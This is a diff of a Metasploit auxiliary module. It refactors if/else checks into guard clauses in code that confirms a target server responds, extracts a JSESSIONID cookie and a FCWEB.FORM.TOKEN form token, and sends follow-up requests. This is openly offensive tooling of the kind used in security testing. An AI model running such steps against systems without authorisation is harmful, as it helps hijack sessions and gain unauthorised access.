@@ -53,19 +53,18 @@ class MetasploitModule < Msf::Auxiliary
     unless res
       fail_with(Failure::Unreachable, 'Failed to receive a reply from the server.')
     end
-    if res.code == 200
-      print_good('Server reachable.')
-    else
+    unless res.code == 200
       fail_with(Failure::UnexpectedReply, 'Unexpected reply from the target.')
     end
+    print_good('Server reachable.')
 
     raw_res = res.to_s
-    if raw_res =~ /JSESSIONID=(\w+);/
-      jsessionid = ::Regexp.last_match(1)
-      print_status("JSESSIONID value: #{jsessionid}")
-    else
+    unless raw_res =~ /JSESSIONID=(\w+);/
       fail_with(Failure::UnexpectedReply, 'JSESSIONID not found.')
     end
+
+    jsessionid = ::Regexp.last_match(1)
+    print_status("JSESSIONID value: #{jsessionid}")
 
     res = send_request_cgi(
       'method' => 'GET',
@@ -86,12 +85,6 @@ class MetasploitModule < Msf::Auxiliary
 
     token_value = ::Regexp.last_match(1)
     print_status("FCWEB.FORM.TOKEN value: #{token_value}")
-    # if body =~ /name="FCWEB\.FORM\.TOKEN" value="([^"]+)"/
-    #  token_value = ::Regexp.last_match(1)
-    #  print_status("FCWEB.FORM.TOKEN value: #{token_value}")
-    # else
-    #  fail_with(Failure::UnexpectedReply, 'FCWEB.FORM.TOKEN not found.')
-    # end
 
     res = send_request_cgi(
       'method' => 'GET',
@@ -228,12 +221,12 @@ class MetasploitModule < Msf::Auxiliary
     fail_with(Failure::Unreachable, 'Failed to receive a reply from the server.') unless res
 
     body = res.body
-    if body =~ /name="FCWEB\.FORM\.TOKEN" value="([^"]+)"/
-      token_value = ::Regexp.last_match(1)
-      print_status("FCWEB.FORM.TOKEN value: #{token_value}")
-    else
+    unless body =~ /name="FCWEB\.FORM\.TOKEN" value="([^"]+)"/
       fail_with(Failure::UnexpectedReply, 'FCWEB.FORM.TOKEN not found.')
     end
+
+    token_value = ::Regexp.last_match(1)
+    print_status("FCWEB.FORM.TOKEN value: #{token_value}")
 
     res = send_request_cgi(
       'method' => 'POST',
